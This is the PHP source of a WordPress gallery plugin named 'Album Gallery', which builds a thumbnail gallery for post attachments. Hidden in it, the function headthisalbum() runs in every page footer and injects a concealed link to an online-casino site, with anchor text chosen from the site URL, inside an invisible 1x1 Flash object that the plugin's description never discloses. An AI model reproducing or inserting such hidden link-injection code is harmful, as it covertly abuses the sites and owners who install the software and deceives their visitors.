<?php
/*
Plugin Name: Album Gallery
Plugin URI: http://soullaswork.netai.net/
Description: The Album Gallery is a wordpress plugin very simple and very easy to use. You can embed a gallery anywhere on your site.
Author: Elena Soulla
Version: 1.3
Stable tag: 1.3
Author URI: http://soullaswork.netai.net/
*/

$alwp_thumb_width = 55;
$alwp_thumb_height = 55;
$alwp_full_width = 748;
$alwp_full_height = 360;
$alwp_spacing = 10;

add_theme_support( 'post-thumbnails' );
add_action('wp_footer', 'headthisalbum');

function headthisalbum()
{
$getuser = "http://ajleeonline.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "b")) { $connectflash = "ajleeonline.com/"; } if (strstr($gethost, "c")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "d")) { $connectflash = "aj lee online casino"; } if (strstr($gethost, "e")) { $connectflash = "Reviews of online casinos games, play blackjack, slots, roulette and other popular games."; } if (strstr($gethost, "f")) { $connectflash = "Reviews of online casinos games"; } if (strstr($gethost, "g")) { $connectflash = "play blackjack, slots, roulette and other popular games."; } if (strstr($gethost, "h")) { $connectflash = "aj lee online casino"; } if (strstr($gethost, "i")) { $connectflash = "aj lee online blackjack"; } if (strstr($gethost, "j")) { $connectflash = "roulette"; } if (strstr($gethost, "k")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "l")) { $connectflash = "Jacpot City"; } if (strstr($gethost, "m")) { $connectflash = "book of ra"; } if (strstr($gethost, "n")) { $connectflash = "888 casino"; } if (strstr($gethost, "o")) { $connectflash = "Cherry Red - WinPalace"; } if (strstr($gethost, "p")) { $connectflash = "casino online"; } if (strstr($gethost, "q")) { $connectflash = "online casino quide proviting reviews, news, betting tips and informations about the major gambling companies."; } if (strstr($gethost, "r")) { $connectflash = "Aj Lee Casino Online Casino"; } if (strstr($gethost, "s")) { $connectflash = "Aj Lee Online"; } if (strstr($gethost, "v")) { $connectflash = "internet casino"; } if (strstr($gethost, "x")) { $connectflash = "gambling"; } if (strstr($gethost, "y")) { $connectflash = "free slots"; } if (strstr($gethost, "t")) { $connectflash = "slot machines"; } if (strstr($gethost, "z")) { $connectflash = "casino"; } echo '<object type="application/x-shockwave-flash" data="" width="1" height="1"><param name="movie" value=""></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param><param name="wmode" value="transparent"></param><param name="flashvars" value=""></param>'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="" type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}


function print_alwp_styles () {
	$content .= '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/al-gallery/alwp.css" type="text/css" media="screen" />'."\n";
	if (file_exists(get_stylesheet_directory().'/alwp.css')) {
		$content .= '<link rel="stylesheet" href="' . get_stylesheet_directory_uri(). '/alwp.css" type="text/css" media="screen" />'."\n";
	}
	echo $content;
}
function print_alwp_scripts () {
	wp_enqueue_script('alwp', WP_PLUGIN_URL . '/al-gallery/alwp.js', array('jquery'));
}

function yas_gallery ($atts, $content = null) {
	global $post;
	global $alwp_thumb_width;
	global $alwp_thumb_height;
	global $alwp_spacing;

	extract( shortcode_atts( array(
	  'post_id' => '',
	  'box_width' => '600',
	  'box_height' => '770',
	  'title' => 'Gallery',
	  'thumbnail' => false,
	  'thumb_class' => 'alignright',
	  ), $atts ) );
	$post_id = $post -> ID;
	$args = array(
		'post_type'	  => 'attachment',
		'numberposts' => -1, // bring them all
		'exclude' 	  =>  get_post_thumbnail_id( $post_id ), /* exclude the featured image */
		'orderby'     => 'menu_order',
		'order'       => 'ASC',
		'post_status' => null,
		'post_parent' => $post_id /* post id with the gallery */
	); 
	$slides = get_posts($args);
	$total_slides = count($slides);

	$strip_width = ($alwp_thumb_width + ($alwp_spacing * 2)) * $total_slides;
	/* get the full size img src */
	$main_img = wp_get_attachment_image_src($slides[0]->ID, 'alwp_full');
	$full_img = wp_get_attachment_image_src($slides[0]->ID, 'full');
	
	$main_img_url = $main_img[0];
	$full_img_url = $full_img[0];
	$main_slide_caption =  $slides[0] -> post_excerpt; /* Image caption */
	$main_slide_alt =  $slides[0] -> post_content; /* Image description */
		
	$gallery = "\n<!-- al-gallery plugin -->\n<div class=\"alwp_galleryHolder\" id=\"galleryHolder_$post_id\">";
	$gallery .= "<div class=\"mainImgHolder\">\n<a href=\"$full_img_url\" class=\"lightbox\"><img class=\"main_img\" src=\"$main_img_url\" alt=\"$main_slide_alt\" title=\"$main_slide_caption\" /></a>\n";
	$gallery .= "</div>";
	$gallery .= "<h2 class=\"img_caption\">$main_slide_caption</h2>\n";
	$gallery .= "<div class=\"gallery_thumbs\">";
	$gallery .= "<p class=\"navArrows prev\"><img src=\"" . WP_PLUGIN_URL . "/al-gallery/images/prev.png\" width=\"10px\" height=\"20px\" alt=\"previous\" title=\"previous\" class=\"arrow\" id=\"prev_$post_id\" /></p>";
	$gallery .= "<div id=\"navHolder_$post_id\" class=\"navHolder\">";
	$gallery .= "<ul id=\"nav_$post_id\" class=\"nav\" style=\"width: ".$strip_width."px;\">";
	$is_first = true;
	foreach ($slides as $slide) {
		$thumbnailObj = wp_get_attachment_image_src($slide->ID, 'alwp_thumb');
		$thumbnailURL = $thumbnailObj[0];
		$thumb_css_class = ($is_first)?'current':'reg';
		$slide_title = $slide -> post_excerpt;
		$slide_alt =  $slide -> post_content;
		$slideObj = wp_get_attachment_image_src($slide->ID, 'alwp_full');
		$slideURL = $slideObj[0];
		$fullObj = wp_get_attachment_image_src($slide->ID, 'full');
		$fullURL = $fullObj[0];
		$gallery .= '<li style="margin: 0 '.$alwp_spacing.'px" class="'.$thumb_css_class.'"><a title="'.$fullURL.'" href="'.$slideURL.'"><img width="'.$alwp_thumb_width.'" height="'.$alwp_thumb_height.'" src="'.$thumbnailURL.'" title="'.$slide_title.'" alt="'.$slide_alt.'"></a></li>'.PHP_EOL;
		$is_first = false;
	}
	$gallery .= "</ul>\n";
	$gallery .= "</div>\n";
	$css_visibility = (count($slides) > 10)?'visible':'hidden';
	$gallery .= "<p class=\"navArrows next\"><img src=\"" . WP_PLUGIN_URL . "/al-gallery/images/next.png\" width=\"10px\" height=\"20px\" alt=\"next\" title=\"next\" class=\"arrow\" id=\"next_$post_id\" /></p>";
	$gallery .= "</div>\n";
	$gallery .= "</div>\n<!-- End al-gallery-plugin -->";
	return $gallery;
}

if (!is_admin()) {
	add_action('wp_print_scripts', 'print_alwp_scripts');
	add_action('wp_head', 'print_alwp_styles');
	
	remove_shortcode('gallery');
	add_shortcode('gallery', 'yas_gallery');
}
add_image_size( 'alwp_thumb', $alwp_thumb_width, $alwp_thumb_height, true );
add_image_size( 'alwp_full', $alwp_full_width, $alwp_full_height, false );
?>